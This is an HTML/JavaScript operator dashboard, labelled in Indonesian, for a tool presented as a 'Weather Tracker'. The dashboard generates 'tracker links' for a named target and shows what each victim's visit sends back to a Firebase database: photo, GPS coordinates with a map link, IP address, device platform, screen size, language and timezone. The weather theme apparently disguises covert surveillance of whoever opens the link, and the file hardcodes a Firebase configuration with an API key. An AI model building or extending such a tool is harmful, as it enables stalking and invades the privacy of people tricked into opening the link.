<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Weather Tracker - Dashboard</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(180deg, #1e3c72 0%, #2a5298 50%, #6a8caf 100%);
      min-height: 100vh;
      color: white;
      padding: 20px;
      position: relative;
    }
    body::before {
      content: '';
      position: fixed;
      width: 400px; height: 400px;
      background: rgba(255,255,255,0.06);
      border-radius: 50%;
      filter: blur(60px);
      top: -100px; left: -100px;
      pointer-events: none;
      z-index: 0;
    }
    .container {
      max-width: 500px;
      margin: 0 auto;
      position: relative;
      z-index: 1;
    }

    /* Header */
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
      padding: 0 5px;
    }
    .header-title {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .header-title .logo {
      font-size: 30px;
      filter: drop-shadow(0 2px 5px rgba(0,0,0,0.3));
    }
    .header-title h1 {
      font-size: 17px;
      font-weight: 500;
      letter-spacing: 0.5px;
    }
    .header-title .user {
      font-size: 11px;
      opacity: 0.7;
      margin-top: 2px;
    }
    #logout {
      padding: 8px 14px;
      background: rgba(255,255,255,0.15);
      border: 1px solid rgba(255,255,255,0.25);
      color: white;
      border-radius: 10px;
      font-size: 12px;
      cursor: pointer;
      transition: all 0.3s;
      font-family: inherit;
    }
    #logout:hover {
      background: rgba(255,80,80,0.3);
      border-color: rgba(255,80,80,0.5);
    }

    /* Card */
    .card {
      background: rgba(255,255,255,0.12);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border: 1px solid rgba(255,255,255,0.2);
      border-radius: 20px;
      padding: 20px;
      margin-bottom: 15px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.15);
    }
    .card-title {
      font-size: 12px;
      letter-spacing: 1.5px;
      text-transform: uppercase;
      opacity: 0.75;
      margin-bottom: 15px;
      display: flex;
      align-items: center;
      gap: 6px;
    }

    /* Generate link form */
    .input-row {
      display: flex;
      gap: 8px;
    }
    .input-row input {
      flex: 1;
      padding: 12px 14px;
      background: rgba(255,255,255,0.1);
      border: 1px solid rgba(255,255,255,0.25);
      border-radius: 12px;
      color: white;
      font-size: 13px;
      outline: none;
      font-family: inherit;
      transition: all 0.3s;
    }
    .input-row input::placeholder { color: rgba(255,255,255,0.5); }
    .input-row input:focus {
      background: rgba(255,255,255,0.18);
      border-color: rgba(255,255,255,0.6);
    }
    .input-row button {
      padding: 12px 18px;
      background: white;
      color: #1e3c72;
      border: none;
      border-radius: 12px;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s;
      font-family: inherit;
      white-space: nowrap;
    }
    .input-row button:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 16px rgba(0,0,0,0.25);
    }
    #link {
      margin-top: 15px;
      font-size: 12px;
      line-height: 1.7;
      word-break: break-all;
    }
    #link a {
      color: #a5d8ff;
      text-decoration: none;
      border-bottom: 1px dashed #a5d8ff;
    }
    #link a:hover { color: white; border-bottom-color: white; }
    #link .link-box {
      background: rgba(0,0,0,0.15);
      padding: 12px;
      border-radius: 10px;
      margin-top: 8px;
      font-family: 'Courier New', monospace;
      font-size: 11px;
      border: 1px solid rgba(255,255,255,0.1);
    }

    /* Data list */
    .data-item {
      background: rgba(255,255,255,0.08);
      border-radius: 16px;
      padding: 15px;
      margin-bottom: 12px;
      border: 1px solid rgba(255,255,255,0.12);
    }
    .data-header {
      display: flex;
      justify-content: space-between;
      align-items: flex-start;
      margin-bottom: 12px;
      gap: 10px;
    }
    .data-header .name {
      font-size: 15px;
      font-weight: 600;
      letter-spacing: 0.3px;
    }
    .data-header .time {
      font-size: 11px;
      opacity: 0.65;
      text-align: right;
    }
    .data-photo {
      width: 100%;
      max-width: 160px;
      border-radius: 12px;
      border: 2px solid rgba(255,255,255,0.25);
      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
      margin-bottom: 12px;
      display: block;
    }
    .data-info {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 8px;
      font-size: 12px;
    }
    .info-row {
      display: flex;
      align-items: center;
      gap: 6px;
      padding: 7px 10px;
      background: rgba(255,255,255,0.07);
      border-radius: 9px;
      border: 1px solid rgba(255,255,255,0.1);
    }
    .info-row .ico { font-size: 14px; }
    .info-row .txt {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
      flex: 1;
    }
    .info-row.full { grid-column: 1 / -1; }
    .info-row a {
      color: #a5d8ff;
      text-decoration: none;
      font-weight: 500;
    }
    .info-row a:hover { color: white; }

    .empty {
      text-align: center;
      font-size: 13px;
      opacity: 0.6;
      padding: 30px 10px;
      letter-spacing: 0.5px;
    }
    .empty .ico { font-size: 40px; display: block; margin-bottom: 10px; opacity: 0.7; }

    @media (max-width: 380px) {
      .data-info { grid-template-columns: 1fr; }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Header -->
    <div class="header">
      <div class="header-title">
        <div class="logo">⛅</div>
        <div>
          <h1>Weather Tracker</h1>
          <div class="user">Login sebagai: <b id="u"></b></div>
        </div>
      </div>
      <button id="logout" onclick="logout()">Logout</button>
    </div>

    <!-- Generate Link -->
    <div class="card">
      <div class="card-title">🔗 Buat Link Pelacak</div>
      <div class="input-row">
        <input id="target" placeholder="Nama target" autocomplete="off">
        <button onclick="genLink()">Buat Link</button>
      </div>
      <div id="link"></div>
    </div>

    <!-- Hasil -->
    <div class="card">
      <div class="card-title">📊 Data Masuk</div>
      <div id="hasil">
        <div class="empty">
          <span class="ico">🛰️</span>
          Menunggu data masuk...
        </div>
      </div>
    </div>
  </div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",
  authDomain: "roraxbali-65802.firebaseapp.com",
  databaseURL: "https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "roraxbali-65802",
  storageBucket: "roraxbali-65802.firebasestorage.app",
  messagingSenderId: "750633313866",
  appId: "1:750633313866:web:3d2e552960e06db83968b3"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const user = localStorage.getItem('username');
if (!user) location.href = 'index.html';
document.getElementById('u').innerText = user;

window.logout = () => {
  localStorage.removeItem('username');
  location.href = 'index.html';
};

window.genLink = () => {
  const target = document.getElementById('target').value.trim() || 'target';
  const base = location.origin + location.pathname.replace('dashboard.html', '');
  const url = `${base}track.html?u=${encodeURIComponent(user)}&t=${encodeURIComponent(target)}`;
  document.getElementById('link').innerHTML = `
    <div class="link-box">
      <div style="opacity:0.7;margin-bottom:6px">» LINK TARGET:</div>
      <a href="${url}" target="_blank">${url}</a>
    </div>
  `;
};

onValue(ref(db, 'lokasi/' + user), snap => {
  const data = snap.val();
  if (!data) {
    document.getElementById('hasil').innerHTML = `
      <div class="empty">
        <span class="ico">🛰️</span>
        Menunggu data masuk...
      </div>`;
    return;
  }
  const arr = Object.values(data).sort((a,b) => b.waktu - a.waktu);
  document.getElementById('hasil').innerHTML = arr.map(d => `
    <div class="data-item">
      <div class="data-header">
        <div class="name">${d.target || 'target'}</div>
        <div class="time">${new Date(d.waktu).toLocaleString('id-ID')}</div>
      </div>
      ${d.foto ? `<img class="data-photo" src="${d.foto}" alt="Foto">` : ''}
      <div class="data-info">
        ${d.lat ? `
          <div class="info-row full">
            <span class="ico">📍</span>
            <span class="txt">${d.kota || 'Lokasi'} — ${d.lat.toFixed(4)}, ${d.lng.toFixed(4)}</span>
          </div>
          <div class="info-row full">
            <span class="ico">🗺️</span>
            <span class="txt"><a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank">Buka di Google Maps</a></span>
          </div>
        ` : ''}
        ${d.ip ? `<div class="info-row"><span class="ico">🌐</span><span class="txt">${d.ip}</span></div>` : ''}
        ${d.suhu !== undefined ? `<div class="info-row"><span class="ico">🌡️</span><span class="txt">${Math.round(d.suhu)}°C</span></div>` : ''}
        ${d.platform ? `<div class="info-row"><span class="ico">💻</span><span class="txt">${d.platform}</span></div>` : ''}
        ${d.screen ? `<div class="info-row"><span class="ico">📱</span><span class="txt">${d.screen}</span></div>` : ''}
        ${d.bahasa ? `<div class="info-row"><span class="ico">🗣️</span><span class="txt">${d.bahasa}</span></div>` : ''}
        ${d.timezone ? `<div class="info-row"><span class="ico">🕒</span><span class="txt">${d.timezone}</span></div>` : ''}
      </div>
    </div>
  `).join('');
});
</script>
</body>
</html>
